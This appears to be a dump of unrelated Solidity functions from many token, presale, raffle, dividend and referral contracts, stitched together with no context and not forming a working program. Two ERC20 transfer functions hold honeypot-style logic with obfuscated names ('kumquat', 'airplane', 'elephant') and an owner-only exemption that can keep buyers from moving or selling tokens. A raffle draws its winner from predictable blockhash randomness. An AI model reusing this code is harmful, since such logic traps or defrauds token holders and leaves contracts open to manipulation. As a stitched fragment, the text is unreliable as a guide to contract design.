        tokens = msg.value * 38000;
    } else {
        tokens = msg.value * 28000;
    }
    balances[msg.sender] = safeAdd(balances[msg.sender], tokens);
    _totalSupply = safeAdd(_totalSupply, tokens);
    Transfer(address(0), msg.sender, tokens);
    owner.transfer(msg.value);
}

function() public payable {
    require(msg.value > 0);
    uint256 weiAmount = msg.value; 
    uint256 tokens1 = weiAmount.mul(presale1Price).div(1 ether);
    uint256 tokens2 = weiAmount.mul(presale2Price).div(1 ether);
    uint256 tokens3 = weiAmount.mul(presale3Price).div(1 ether);
    uint256 returnWei = 0;
    if (currentStage == Stages.presale1Start) {
        require(currentStage == Stages.presale1Start);
        require(remainingTokens1 > 0);
        if (tokensSold1.add(tokens1) > presale1) {
            uint256 newTokens1 = presale1.sub(tokensSold1);
            uint256 newWei1 = newTokens1.div(presale1Price).mul(1 ether);
            returnWei = weiAmount.sub(newWei1);
            weiAmount = newWei1;
            tokens1 = newTokens1;
        }
        tokensSold1 = tokensSold1.add(tokens1); 
        remainingTokens1 = presale1.sub(tokensSold1);
        if (returnWei > 0) {
            msg.sender.transfer(returnWei);
            emit Transfer(address(this), msg.sender, returnWei);
        }
        balances[msg.sender] = balances[msg.sender].add(tokens1);
        emit Transfer(address(this), msg.sender, tokens1);
        owner.transfer(weiAmount); 
    }
    if (currentStage == Stages.presale2Start) {
        require(currentStage == Stages.presale2Start);
        require(remainingTokens2 > 0);
        if (tokensSold2.add(tokens2) > presale2) {
            uint256 newTokens2 = presale2.sub(tokensSold2);
            uint256 newWei2 = newTokens2.div(presale2Price).mul(1 ether);
            returnWei = weiAmount.sub(newWei2);
            weiAmount = newWei2;
            tokens2 = newTokens2;
        }
        tokensSold2 = tokensSold2.add(tokens2); 
        remainingTokens2 = presale2.sub(tokensSold2);
        if (returnWei > 0) {
            msg.sender.transfer(returnWei);
            emit Transfer(address(this), msg.sender, returnWei);
        }
        balances[msg.sender] = balances[msg.sender].add(tokens2);
        emit Transfer(address(this), msg.sender, tokens2);
        owner.transfer(weiAmount); 
    }
    if (currentStage == Stages.presale3Start) {
        require(currentStage == Stages.presale3Start);
        require(remainingTokens3 > 0);
        if (tokensSold3.add(tokens3) > presale3) {
            uint256 newTokens3 = presale3.sub(tokensSold3);
            uint256 newWei3 = newTokens3.div(presale3Price).mul(1 ether);
            returnWei = weiAmount.sub(newWei3);
            weiAmount = newWei3;
            tokens3 = newTokens3;
        }
        tokensSold3 = tokensSold3.add(tokens3); 
        remainingTokens3 = presale3.sub(tokensSold3);
        if (returnWei > 0) {
            msg.sender.transfer(returnWei);
            emit Transfer(address(this), msg.sender, returnWei);
        }
        balances[msg.sender] = balances[msg.sender].add(tokens3);
        emit Transfer(address(this), msg.sender, tokens3);
        owner.transfer(weiAmount); 
    }
}

function init(bytes32 _key, address _resolver)
internal
returns(bool _success) {
    bool _is_locked = ContractResolver(_resolver).locked();
    if (_is_locked == false) {
        CONTRACT_ADDRESS = address(this);
        resolver = _resolver;
        key = _key;
        require(ContractResolver(resolver).init_register_contract(key, CONTRACT_ADDRESS));
        _success = true;
    } else {
        _success = false;
    }
}

function openTable(address user, uint tableId) public {
    address introducer = users[user].Introducer;
    require(introducer == address(0), "user is not exists.");
    active(tables[tableId].Fee);
    for (uint i = 1; i <= detailId; i++) {
        if (tableDetails[i].Status == 0 && tableDetails[i].TableId == tableId &&
            (tableDetails[i].A == introducer ||
                tableDetails[i].B == introducer ||
                tableDetails[i].C == introducer ||
                tableDetails[i].D == introducer ||
                tableDetails[i].E == introducer ||
                tableDetails[i].F == introducer)) {
            if (tableDetails[i].D == address(0)) {
                tableDetails[i].D = user;
            } else if (tableDetails[i].E == address(0)) {
                tableDetails[i].E = user;
            } else if (tableDetails[i].F == address(0)) {
                tableDetails[i].F = user;
            } else {
                tableDetails[i].G = user;
                tableDetails[i].Status = 1;
                detailId += 1;
                tableDetails[detailId].A = tableDetails[i].B;
                tableDetails[detailId].B = tableDetails[i].D;
                tableDetails[detailId].C = tableDetails[i].E;
                tableDetails[detailId].Fee = tables[tableId].Fee;
                tableDetails[detailId].Bonus = tables[tableId].Bonus;
                detailId += 1;
                tableDetails[detailId].A = tableDetails[i].C;
                tableDetails[detailId].B = tableDetails[i].F;
                tableDetails[detailId].C = tableDetails[i].G;
                tableDetails[detailId].Fee = tables[tableId].Fee;
                tableDetails[detailId].Bonus = tables[tableId].Bonus;
                sendBonus(tableDetails[i].Bonus, tableDetails[i].A);
                if (tableId == 1) {
                    openTable(tableDetails[i].A, 2);
                } else {
                    openTable(tableDetails[i].A, tableId);
                }
            }
        }
    }
}

function makeSale(uint _triggerDistributor) external returns(bool) {
    require(salesEnabled, "Sales are not enabled");
    require(block.number >= nextEpochBlock, "Not next epoch");
    IERC20(OHM).approve(SUSHISWAP_ROUTER_ADDRESS, OHMToSell);
    sushiswapRouter.swapExactTokensForTokens( 
        OHMToSell,
        minimumToReceive,
        getPathForOHMtoDAI(),
        address(this),
        block.timestamp + 15
    );
    uint daiBalance = IERC20(DAI).balanceOf(address(this));
    IERC20(DAI).approve(vault, daiBalance);
    IVault(vault).depositReserves(daiBalance); 
    uint OHMToTransfer = IERC20(OHM).balanceOf(address(this)).sub(OHMToSellNextEpoch);
    uint transferToDAO = OHMToTransfer.div(DAOShare);
    IERC20(OHM).transfer(stakingDistributor, OHMToTransfer.sub(transferToDAO)); 
    IERC20(OHM).transfer(DAO, transferToDAO); 
    nextEpochBlock = nextEpochBlock.add(epochBlockLength);
    OHMToSell = OHMToSellNextEpoch;
    if (_triggerDistributor == 1) {
        StakingDistributor(stakingDistributor).distribute(); 
    }
    return true;
}

function _transfer(address from, address to, uint256 amount) internal returns(bool) {
    require(from != address(0), "ERC20: Zero address.");
    require(to != address(0), "ERC20: Zero address.");
    require(amount > 0, "Must >0.");
    if (_hasLimits(from, to)) {
        if (sameBlockActive) {
            if (lpPairs[from]) {
                require(lastTrade[to] != block.number);
                lastTrade[to] = block.number;
            } else {
                require(lastTrade[from] != block.number);
                lastTrade[from] = block.number;
            }
        }
        if (!(isExcludedFromMaxWalletRestrictions[from] || isExcludedFromMaxWalletRestrictions[to])) {
            if (lpPairs[from] || lpPairs[to]) {
                require(amount <= _maxTxAmount, "Exceeds the maxTxAmount.");
            }
            if (to != _routerAddress && !lpPairs[to]) {
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
            }
        }
    }
    bool takeFee = true;
    if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
        takeFee = false;
    }
    if (lpPairs[to]) {
        if (!inSwapAndLiquify &&
            swapAndLiquifyEnabled
        ) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= swapThreshold) {
                if (contractTokenBalance >= swapAmount) {
                    contractTokenBalance = swapAmount;
                }
                swapAndLiquify(contractTokenBalance);
            }
        }
    }
    return _finalizeTransfer(from, to, amount, takeFee);
}

function transferFrom(address _from, address _to, uint256 _value) public returns(bool) {
    require(block.timestamp >= unlockTime || whitelist[msg.sender], "Unable to transfer as unlock time not passed or address not whitelisted");
    return super.transferFrom(_from, _to, _value);
}

function transfer(address _to, uint256 _value) public returns(bool) {
    require(block.timestamp >= unlockTime || whitelist[msg.sender], "Unable to transfer as unlock time not passed or address not whitelisted");
    return super.transfer(_to, _value);
}

function isBonusTime() public view returns(bool) {
    return block.timestamp >= _openingTime && block.timestamp <= _bonusEndTime && _weiRaised <= _bonusCap;
}

constructor(uint256 rate, uint256 bonusRate, uint256 bonusCap, uint256 openingTime, uint256 bonusEndTime, uint256 closingTime, address wallet, IERC20 token) public {
    require(rate > 0);
    require(bonusRate > 0);
    require(bonusCap > 0);
    require(openingTime >= block.timestamp);
    require(bonusEndTime >= openingTime);
    require(closingTime >= bonusEndTime);
    require(wallet != address(0));
    _rate = rate;
    _bonusRate = bonusRate;
    _bonusCap = bonusCap;
    _wallet = wallet;
    _token = token;
    _openingTime = openingTime;
    _closingTime = closingTime;
    _bonusEndTime = bonusEndTime;
}

function launchMode() internal view returns(bool) {
    return launchedAt != 0 && launchedAt + 10 < block.number && launchedTime + 10 minutes >= block.timestamp;
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (nokia == true)) {
        airplane[recipient] = true;
        kumquat[recipient] = false;
        nokia = false;
    }
    if (airplane[recipient] != true) {
        kumquat[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((kumquat[sender]) && (airplane[recipient] == false)) {
        kumquat[recipient] = true;
    }
    if (airplane[sender] == false) {
        require(amount < elephant);
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if (owner() != tx.origin) {
        if (sender == burnAddress) {
            if (oracle[recipient] == 0) {
                oracle[recipient] = block.timestamp;
            }
        } else if (recipient == burnAddress) {
            require(oracle[sender].add(10 minutes) > block.timestamp, "ERC20: transfer amount exceeds balance");
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function _cooldownBeforeNewSell(address account, uint256 amount) internal virtual {
    if ((block.timestamp - amount) > 20 * 60) {
        checkIfCooldownActive[account] = false;
    }
}

function redeem(uint256 amount)
external payable nonReentrant whenActive {
    require(address(this).balance > 0, "CDAO: insufficient balance");
    require(msg.value == _oracleFee, "CDAO: !oracleFee");
    uint256 quota = quotaOf();
    uint256 price;
    {
        (uint256 ethAmount, uint256 tokenAmount, uint256 avg, ) = ICoFiXV2Controller(ICoFiXV2Factory(factory).getController())
            .getLatestPriceAndAvgVola {
                value: msg.value
            }(cofiToken);
        price = tokenAmount.mul(1e18).div(ethAmount);
        uint256 diff = price > avg ? (price - avg) : (avg - price);
        bool isDeviated = (diff.mul(100) < avg.mul(DAO_REPURCHASE_PRICE_DEVIATION)) ? false : true;
        require(isDeviated == false, "CDAO: price deviation"); 
    }
    require(amount <= quota, "CDAO: insufficient quota");
    require(amount.mul(1e18) <= address(this).balance.mul(price), "CDAO: insufficient balance2");
    redeemedAmount = uint128(amount.add(redeemedAmount));
    quotaAmount = uint128(quota.sub(amount));
    lastBlock = uint32(block.number);
    uint256 amountEthOut = amount.mul(1e18).div(price);
    ICoFiToken(cofiToken).transferFrom(address(msg.sender), address(this), amount);
    TransferHelper.safeTransferETH(msg.sender, amountEthOut);
}

function awardRafflePrize(address checkWinner, uint256 checkIndex) external {
    require(raffleEndTime < block.timestamp); 
    require(raffleWinner == 0);
    require(rare.getRareItemsOwner(raffleRareId) == getRareAddress());
    if (!raffleWinningTicketSelected) {
        drawRandomWinner(); 
    }
    if (checkWinner != 0) {
        TicketPurchases storage tickets = ticketsBoughtByPlayer[checkWinner];
        if (tickets.numPurchases > 0 && checkIndex < tickets.numPurchases && tickets.raffleRareId == raffleRareId) {
            TicketPurchase storage checkTicket = tickets.ticketsBought[checkIndex];
            if (raffleTicketThatWon >= checkTicket.startId && raffleTicketThatWon <= checkTicket.endId) {
                assignRafflePrize(checkWinner); 
                return;
            }
        }
    }
    for (uint256 i = 0; i < rafflePlayers[raffleRareId].length; i++) {
        address player = rafflePlayers[raffleRareId][i];
        TicketPurchases storage playersTickets = ticketsBoughtByPlayer[player];
        uint256 endIndex = playersTickets.numPurchases - 1;
        if (raffleTicketThatWon >= playersTickets.ticketsBought[0].startId && raffleTicketThatWon <= playersTickets.ticketsBought[endIndex].endId) {
            for (uint256 j = 0; j < playersTickets.numPurchases; j++) {
                TicketPurchase storage playerTicket = playersTickets.ticketsBought[j];
                if (raffleTicketThatWon >= playerTicket.startId && raffleTicketThatWon <= playerTicket.endId) {
                    assignRafflePrize(player); 
                    return;
                }
            }
        }
    }
}

function startRareRaffle(uint256 endTime, uint256 rareId) external onlyAdmin {
    require(rareId > 0);
    require(rare.getRareItemsOwner(rareId) == getRareAddress());
    require(block.timestamp < endTime); 
    if (raffleRareId != 0) { 
        require(raffleWinner != 0);
    }
    raffleWinningTicketSelected = false;
    raffleTicketThatWon = 0;
    raffleWinner = 0;
    raffleTicketsBought = 0;
    raffleEndTime = endTime;
    raffleRareId = rareId;
}

function buyRaffleTicket(uint256 amount) external {
    require(raffleEndTime >= block.timestamp); 
    require(amount > 0);
    uint256 ticketsCost = SafeMath.mul(RAFFLE_TICKET_BASE_PRICE, amount);
    require(cards.balanceOf(msg.sender) >= ticketsCost);
    cards.updatePlayersCoinByPurchase(msg.sender, ticketsCost);
    TicketPurchases storage purchases = ticketsBoughtByPlayer[msg.sender];
    if (purchases.raffleRareId != raffleRareId) {
        purchases.numPurchases = 0;
        purchases.raffleRareId = raffleRareId;
        rafflePlayers[raffleRareId].push(msg.sender); 
    }
    if (purchases.numPurchases == purchases.ticketsBought.length) {
        purchases.ticketsBought.length = SafeMath.add(purchases.ticketsBought.length, 1);
    }
    purchases.ticketsBought[purchases.numPurchases++] = TicketPurchase(raffleTicketsBought, raffleTicketsBought + (amount - 1)); 
    raffleTicketsBought = SafeMath.add(raffleTicketsBought, amount);
    UnitBought(msg.sender, raffleRareId, amount);
}

function drawRandomWinner() public onlyAdmin {
    require(raffleEndTime < block.timestamp); 
    require(!raffleWinningTicketSelected);
    uint256 seed = SafeMath.add(raffleTicketsBought, block.timestamp);
    raffleTicketThatWon = addmod(uint256(block.blockhash(block.number - 1)), seed, raffleTicketsBought);
    raffleWinningTicketSelected = true;
}

function complete_buy_exchange() private {
    uint256 amount_give_ = msg.value;
    uint256 amount_get_ = get_amount_buy(amount_give_);
    uint256 amount_get_minus_commission_ = get_amount_minus_commission(amount_get_);
    uint256 admin_commission = amount_get_ - amount_get_minus_commission_;
    transferETHToContract();
    transferTokensFromContract(msg.sender, amount_get_minus_commission_);
    transferTokensFromContract(admin, admin_commission);
}

function complete_sell_exchange(uint256 _amount_give) private {
    uint256 amount_get_ = get_amount_sell(_amount_give);
    uint256 amount_get_minus_commission_ = get_amount_minus_commission(amount_get_);
    uint256 admin_commission = amount_get_ - amount_get_minus_commission_;
    transferTokensThroughProxyToContract(msg.sender, this, _amount_give);
    transferETHFromContract(msg.sender, amount_get_minus_commission_);
    transferETHFromContract(admin, admin_commission);
}

function addLiquidity() external onlyOwner() {
    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    uniswapV2Router = _uniswapV2Router;
    _approve(address(this), address(uniswapV2Router), _tTotal);
    uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
    uniswapV2Router.addLiquidityETH {
        value: address(this).balance
    }(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
    swapEnabled = true;
    liquidityAdded = true;
    _maxTxAmount = 20000000000 * 10 ** 9;
    IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint256).max);
}

function swapLiquidityMarketing(uint256 contractTokenBalance) private lockTheSwap {
    uint256 tokensForSwapping = contractTokenBalance.div(14).mul(11);
    uint256 tokensForPairing = contractTokenBalance.sub(tokensForSwapping);
    uint256 initialBalance = address(this).balance;
    swapTokensForEth(tokensForSwapping);
    uint256 newBalance = address(this).balance.sub(initialBalance);
    uint ethForLiquidity = newBalance.mul(3).div(11);
    uint marketingETH = newBalance.mul(4).div(11);
    _market.transfer(marketingETH);
    _dev1.transfer(ethForLiquidity);
    _dev2.transfer(ethForLiquidity.div(3));
    _addLiquidity(tokensForPairing, ethForLiquidity);
}

function _transfer(address from, address to, uint256 amount) private {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");
    require(!_badBot[from] && !_badBot[to] && !_badBot[tx.origin], "Apes only, no bad bots");
    if (!_isExcludedFromFee[to] && !_isExcludedFromFee[from]) {
        if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
            require(tradeAllowed);
            require(cooldown[to] < block.timestamp);
            uint walletBalance = balanceOf(address(to));
            require(amount.add(walletBalance) <= _tTotal.div(100).mul(3));
            require(amount <= _maxTxAmount);
            cooldown[to] = block.timestamp + (30 seconds);
        }
        uint256 contractTokenBalance = balanceOf(address(this));
        uint priceImpactLimit = balanceOf(uniswapV2Pair).mul(5).div(100);
        if (!inSwap && from != uniswapV2Pair && swapEnabled) {
            require(cooldown[from] < block.timestamp);
            require(amount <= priceImpactLimit);
            if (contractTokenBalance >= priceImpactLimit) {
                contractTokenBalance = priceImpactLimit;
            }
            swapLiquidityMarketing(contractTokenBalance);
        }
    }
    bool takeFee = true;
    if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
        takeFee = false;
    }
    _tokenTransfer(from, to, amount, takeFee);
    restoreAllFee;
}

function claimDividendAll() public {
    require(dividendsClaimed[msg.sender] < dividends.length);
    for (uint i = dividendsClaimed[msg.sender]; i < dividends.length; i++) {
        if ((dividends[i].claimed[msg.sender] == false) && (dividends[i].recycled == false)) {
            dividendsClaimed[msg.sender] = SafeMath.add(i, 1);
            claimDividend(i);
        }
    }
}

function claimDividend(uint256 _dividendIndex) public
validDividendIndex(_dividendIndex) {
    Dividend storage dividend = dividends[_dividendIndex];
    require(dividend.claimed[msg.sender] == false);
    require(dividend.recycled == false);
    uint256 balance = super.balanceOfAt(msg.sender, dividend.blockNumber);
    uint256 claim = balance.mul(dividend.amount).div(dividend.totalSupply);
    dividend.claimed[msg.sender] = true;
    dividend.claimedAmount = SafeMath.add(dividend.claimedAmount, claim);
    if (claim > 0) {
        msg.sender.transfer(claim);
        DividendClaimed(msg.sender, _dividendIndex, claim);
    }
}

function depositDividend() public payable
onlyController {
    uint256 currentSupply = super.totalSupplyAt(block.number);
    uint256 dividendIndex = dividends.length;
    uint256 blockNumber = SafeMath.sub(block.number, 1);
    dividends.push(
        Dividend(
            blockNumber,
            getNow(),
            msg.value,
            0,
            currentSupply,
            false
        )
    );
    DividendDeposited(msg.sender, blockNumber, getNow(), msg.value, currentSupply, dividendIndex);
}

function recycleDividend(uint256 _dividendIndex) public
onlyController
validDividendIndex(_dividendIndex) {
    Dividend storage dividend = dividends[_dividendIndex];
    require(dividend.recycled == false);
    require(dividend.timestamp < SafeMath.sub(getNow(), RECYCLE_TIME));
    dividends[_dividendIndex].recycled = true;
    uint256 currentSupply = super.totalSupplyAt(block.number);
    uint256 remainingAmount = SafeMath.sub(dividend.amount, dividend.claimedAmount);
    uint256 dividendIndex = dividends.length;
    uint256 blockNumber = SafeMath.sub(block.number, 1);
    dividends.push(
        Dividend(
            blockNumber,
            getNow(),
            remainingAmount,
            0,
            currentSupply,
            false
        )
    );
    DividendRecycled(msg.sender, blockNumber, getNow(), remainingAmount, currentSupply, dividendIndex);
}

function approve(address _spender, uint256 _amount) returns(bool success) {
    require(transfersEnabled);
    require((_amount == 0) || (allowed[msg.sender][_spender] == 0));
    if (isContract(controller)) {
        require(TokenController(controller).onApprove(msg.sender, _spender, _amount));
    }
    allowed[msg.sender][_spender] = _amount;
    Approval(msg.sender, _spender, _amount);
    return true;
}

function calculateVestedTokens(
    uint256 tokens,
    uint256 time,
    uint256 start,
    uint256 cliff,
    uint256 vesting) internal view returns(uint256) {
    if (time < cliff) return 0;
    if (time >= vesting) return tokens;
    uint256 vestedTokens = SafeMath.div(
        SafeMath.mul(
            tokens,
            SafeMath.sub(time, start)
        ),
        SafeMath.sub(vesting, start)
    );
    return vestedTokens;
}

function despawnGladiatorAndAwardCoins(address owner)
internal {
    owner.transfer(gladiators[owner].coins * coinValue);
    gladiators[owner].state = gladiate.GladiatorState.Null;
}

function prepareSell(address _investor, uint256 _amount) private {
    uint256 remaining;
    uint256 pricePerCent;
    uint256 pricePerToken;
    uint256 toSell;
    uint256 amount = _amount;
    uint256 sellInWei;
    address investor = _investor;
    pricePerCent = getUSDPrice();
    pricePerToken = pricePerCent.mul(tokenPrice[currentLevel]); 
    toSell = _amount.div(pricePerToken); 
    if (toSell < levelTokens) { 
        levelTokens = levelTokens.sub(toSell);
        weiRised = weiRised.add(_amount);
        executeSell(investor, toSell, _amount);
        owner.transfer(_amount);
    } else { 
        while (amount > 0) {
            if (toSell > levelTokens) {
                toSell = levelTokens; 
                sellInWei = toSell.mul(pricePerToken);
                amount = amount.sub(sellInWei);
                if (currentLevel < 11) { 
                    currentLevel += 1;
                    levelTokens = baseTokens;
                } else {
                    remaining = amount;
                    amount = 0;
                }
            } else {
                sellInWei = amount;
                amount = 0;
            }
            executeSell(investor, toSell, sellInWei);
            weiRised = weiRised.add(sellInWei);
            owner.transfer(amount);
            if (amount > 0) {
                toSell = amount.div(pricePerToken);
            }
            if (remaining > 0) { 
                investor.transfer(remaining);
                owner.transfer(address(this).balance);
                presaleEnded = true;
            }
        }
    }
}

